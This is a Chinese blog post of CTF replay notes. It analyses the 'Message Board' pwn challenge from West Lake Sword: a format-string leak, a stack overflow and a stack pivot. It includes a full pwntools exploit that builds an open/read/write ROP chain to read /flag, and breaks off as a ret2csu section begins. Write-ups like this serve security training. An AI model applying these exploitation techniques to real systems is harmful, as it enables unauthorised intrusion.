

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
  <link rel="icon" href="/img/avatar.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Csc8">
  <meta name="keywords" content="">
  
    <meta name="description" content="NssRound#9，西湖论剑，有两道JIT—PWN没做复现。VNCTF，剩三道等下佬的wp再更">
<meta property="og:type" content="article">
<meta property="og:title" content="二月复现笔记">
<meta property="og:url" content="http://csc8.github.io/2023/03/03/%E4%BA%8C%E6%9C%88%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Csc8_Blog">
<meta property="og:description" content="NssRound#9，西湖论剑，有两道JIT—PWN没做复现。VNCTF，剩三道等下佬的wp再更">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://csc8.github.io/img/wallhaven-wq12m6.jpg">
<meta property="article:published_time" content="2023-03-03T04:10:32.763Z">
<meta property="article:modified_time" content="2023-03-03T04:44:38.001Z">
<meta property="article:author" content="Csc8">
<meta property="article:tag" content="WP">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://csc8.github.io/img/wallhaven-wq12m6.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>二月复现笔记 - Csc8_Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"csc8.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Csc8_Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/wallhaven-wq12m6.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="二月复现笔记"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Csc8
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-03-03 12:10" pubdate>
          2023年3月3日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          31k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          263 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">二月复现笔记</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="②西湖论剑"><a href="#②西湖论剑" class="headerlink" title="②西湖论剑"></a>②西湖论剑</h1><h2 id="1-Message-Board"><a href="#1-Message-Board" class="headerlink" title="1.Message Board"></a>1.Message Board</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>前置</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">chen@chen:~/桌面/match/XI_HU/Message</span> <span class="hljs-string">Board$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./pwn</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/chen/桌面/match/XI_HU/Message Board/pwn&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <br><span class="hljs-string">chen@chen:~/桌面/match/XI_HU/Message</span> <span class="hljs-string">Board$</span> <span class="hljs-string">seccomp-tools</span> <span class="hljs-string">dump</span> <span class="hljs-string">./pwn</span><br> <span class="hljs-string">line</span>  <span class="hljs-string">CODE</span>  <span class="hljs-string">JT</span>   <span class="hljs-string">JF</span>      <span class="hljs-string">K</span><br><span class="hljs-string">=================================</span><br> <span class="hljs-attr">0000:</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-string">A</span> <span class="hljs-string">=</span> <span class="hljs-string">arch</span><br> <span class="hljs-attr">0001:</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-type">!=</span> <span class="hljs-string">ARCH_X86_64)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-attr">0002:</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-string">A</span> <span class="hljs-string">=</span> <span class="hljs-string">sys_number</span><br> <span class="hljs-attr">0003:</span> <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">0x40000000</span><span class="hljs-string">)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-attr">0004:</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-type">!=</span> <span class="hljs-number">0xffffffff</span><span class="hljs-string">)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-attr">0005:</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-string">if</span> <span class="hljs-string">(A</span> <span class="hljs-string">==</span> <span class="hljs-string">execve)</span> <span class="hljs-string">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-attr">0006:</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-string">return</span> <span class="hljs-string">ALLOW</span><br> <span class="hljs-attr">0007:</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-string">return</span> <span class="hljs-string">KILL</span><br></code></pre></td></tr></table></figure>

<p><strong>ban了一个execve，通过orw</strong></p>
<p><strong>逆向</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C0h] BYREF</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+8h] [rbp-B8h] BYREF</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">176</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-B0h] BYREF</span><br><br>  init_sandbox();<br>  <span class="hljs-keyword">if</span> ( !dword_4040AC )<br>  &#123;<br>    <span class="hljs-built_in">strcpy</span>(dest, <span class="hljs-string">&quot;Hello, &quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    dword_4040AC = <span class="hljs-number">1</span>;<br>  &#125;<br>  v3 = <span class="hljs-built_in">strcat</span>(dest, buf);<br>  <span class="hljs-built_in">printf</span>(v3);  			<span class="hljs-comment">//栈上的格式化字符串漏洞，输入长度8字节,泄露libc</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now, please say something to DASCTF:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, v7, <span class="hljs-number">0xC0</span>uLL); <span class="hljs-comment">//0x10栈溢出，栈迁移，做ret2syscall--orw</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Posted Successfully~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>偏移：6</strong></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li><strong>第一次输入：fmt：leak_libc 以及 栈地址</strong></li>
<li><strong>第二次输入：字符串位于泄露出的栈地址+0x10处</strong></li>
<li><strong>布栈：ret2syscall的方法，布置ORW链</strong></li>
<li><strong>栈迁移，实现再次写，rsi由rbp索引</strong></li>
<li><strong>栈迁移回栈上，执行ROP链</strong></li>
</ol>
<h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call foo<br>;push rip+8<br>;mov foo_addr, rip<br><br>foo<br>;push rbp<br>;mov rbp,rsp<br><br>leave<br>;mov rsp, rbp<br>;pop rbp<br><br>ret<br>;pop rip<br><br></code></pre></td></tr></table></figure>

<p>函数调用开始，和末尾的leave_ret是两个相反的过程</p>
<p>如果存在溢出0x10字节，意味着可以控制rbp，将ret篡改为leave_ret这一gadget，程序的末尾即是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leave <br>;mov rsp, rbp<br>;pop rbp<br><br>leave<br>;mov rsp, rbp<br>;pop rbp<br><br>ret<br>;pop rip<br></code></pre></td></tr></table></figure>

<p><strong>流程</strong></p>
<p><strong>栈溢出篡改rbp , ret</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rbp: Hack_addr - 0x8<br>ret: leave_ret<br></code></pre></td></tr></table></figure>



<h4 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h4><p><strong>第二次输入位置：stack_addr - 0xb0</strong></p>
<p><code>stack_addr：0x7ffded449570</code></p>
<p><code>stack_addr - 0xb0：0x7ffded4494c0 ◂— 0x67616c662f /* &#39;/flag&#39; */</code></p>
<p><strong>栈迁移位置：stack_addr - 0xb0 + 0x8</strong></p>
<p>因为此处是先填入0x8字节的内容，所以栈迁移地址直接写到此处即可</p>
<p>(其他情况下，放在目标地址-0x8处)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00:0000│ rsp 0x7ffded4494a8 —▸ 0x401391 ◂— lea    rdi, [rip + 0xcd5]<br>01:0008│     0x7ffded4494b0 ◂— 0x70243133257025 /* &#x27;%p%31$p&#x27; */<br>02:0010│     0x7ffded4494b8 ◂— &#x27;Hello, %p%31$p&#x27;<br>03:0018│ rsi 0x7ffded4494c0 ◂— 0x702431332570 /* &#x27;p%31$p&#x27; */<br>04:0020│     0x7ffded4494c8 ◂— 0x0<br>... ↓        3 skipped<br><br><br><br>00:0000│ rsp 0x7ffded4494b0 ◂— 0x70243133257025 /* &#x27;%p%31$p&#x27; */<br>01:0008│     0x7ffded4494b8 ◂— &#x27;Hello, %/flag&#x27;<br>02:0010│ rsi 0x7ffded4494c0 ◂— 0x67616c662f /* &#x27;/flag&#x27; */<br>03:0018│     0x7ffded4494c8 —▸ 0x7fe6c983bb6a (init_cacheinfo+234) ◂— pop    rdi<br>04:0020│     0x7ffded4494d0 —▸ 0x7ffded4494c0 ◂— 0x67616c662f /* &#x27;/flag&#x27; */<br>05:0028│     0x7ffded4494d8 —▸ 0x7fe6c983e01f (__gconv_close_transform+239) ◂— pop    rsi<br>06:0030│     0x7ffded4494e0 ◂— 0x0<br>07:0038│     0x7ffded4494e8 —▸ 0x7fe6c9925ce0 (open64) ◂— endbr64 <br><br><br><br></code></pre></td></tr></table></figure>



<p><strong>leave_ret_gadget</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000004012E1</span> C9                            leave<br>.text:<span class="hljs-number">00000000004012E2</span> C3                            retn<br></code></pre></td></tr></table></figure>



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: &lt;encoding name&gt; -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>banary = <span class="hljs-string">&quot;./pwn&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span><br>port = <span class="hljs-number">25994</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_after_clean</span>(<span class="hljs-params">content: <span class="hljs-built_in">bytes</span> = <span class="hljs-string">b&quot;&quot;</span>, until: <span class="hljs-built_in">bytes</span> = <span class="hljs-literal">None</span>,\</span><br><span class="hljs-params">                     timeout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.05</span>, no_show: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>	<span class="hljs-keyword">if</span> until <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>		p.recvuntil(flat(until))<br>	<span class="hljs-keyword">else</span>:<br>        	received = p.clean(timeout)<br>        	<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> no_show:<br>            		<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[$]received:\n<span class="hljs-subst">&#123;received.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)&#125;</span>&quot;</span>)<br>	p.send(flat(content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendline_after_clean</span>(<span class="hljs-params">content: <span class="hljs-built_in">bytes</span> = <span class="hljs-string">b&quot;&quot;</span>, until: <span class="hljs-built_in">bytes</span> = <span class="hljs-literal">None</span>,\</span><br><span class="hljs-params">                         timeout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.05</span>, no_show: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>	send_after_clean([content, p.newline], until, timeout, no_show)<br><br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#--------------------1.leak_libc &amp; stack-------------------</span><br>payload1 = <span class="hljs-string">b&#x27;%p%31$p&#x27;</span><br>sa(<span class="hljs-string">b&#x27;name:&#x27;</span>, payload1)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Hello, &#x27;</span>)<br><br>stack_addr= <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) + <span class="hljs-number">0xc0</span>  <span class="hljs-comment">#rbp</span><br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>)<br>libc_base= <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]- <span class="hljs-number">243</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#--------------------2.Gadget----------------------------</span><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>offset_2 =libc.search(asm(<span class="hljs-string">&#x27;pop rdx;ret&#x27;</span>)).__next__() <span class="hljs-comment">#0x1c9a---BUG</span><br>lg(<span class="hljs-string">&#x27;offset_2&#x27;</span>) <br><br>pop_rdi_ret = <span class="hljs-number">0x0000000000401413</span><br>pop_rsi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rsi; ret&#x27;</span>)).__next__()<br>pop_rdx_ret = libc_base + <span class="hljs-number">0x142c92</span><br><br><br>flag = stack_addr - <span class="hljs-number">0xb0</span> <br>leave_ret = <span class="hljs-number">0x00000000004012e1</span><br><br>lg(<span class="hljs-string">&#x27;read_addr&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;open_addr&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;write_addr&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pop_rdi_ret&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pop_rsi_ret&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pop_rdx_ret&#x27;</span>)<br><br><span class="hljs-comment">#--------------------3.ORW------------------------------</span><br>orw_payload = <span class="hljs-string">b&#x27;/flag\0\0\0&#x27;</span><br>orw_payload += p64(pop_rdi_ret)+ p64(flag) +p64(pop_rsi_ret)+ p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>orw_payload += p64(pop_rdi_ret)+ p64(<span class="hljs-number">3</span>)+ p64(pop_rsi_ret)+ p64(stack_addr+<span class="hljs-number">0x90</span>)+ p64(pop_rdx_ret) + p64(<span class="hljs-number">0x30</span>)+ p64(read_addr)<br>orw_payload += p64(pop_rdi_ret)+ p64(<span class="hljs-number">1</span>)+p64(pop_rsi_ret)+ p64(stack_addr+<span class="hljs-number">0x90</span>)+ p64(pop_rdx_ret)+ p64(<span class="hljs-number">0x30</span>)+ p64(write_addr)<br><br><span class="hljs-comment">#--------------------4.Stack_pivot &amp; PWN----------------------</span><br>payload2 = orw_payload.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) + p64(flag)+ p64(leave_ret)<br>sa(<span class="hljs-string">b&#x27;DASCTF:&#x27;</span>,payload2)<br><br>pi() <br></code></pre></td></tr></table></figure>





<h2 id="2-babycalc"><a href="#2-babycalc" class="headerlink" title="2.babycalc"></a>2.babycalc</h2><h3 id="re2csu"><a href="#re2csu" class="headerlink" title="re2csu"></a>re2csu</h3><p>ret2csu的目的是可以通过gadget，控制所有寄存器，直接实现一个函数的使用</p>
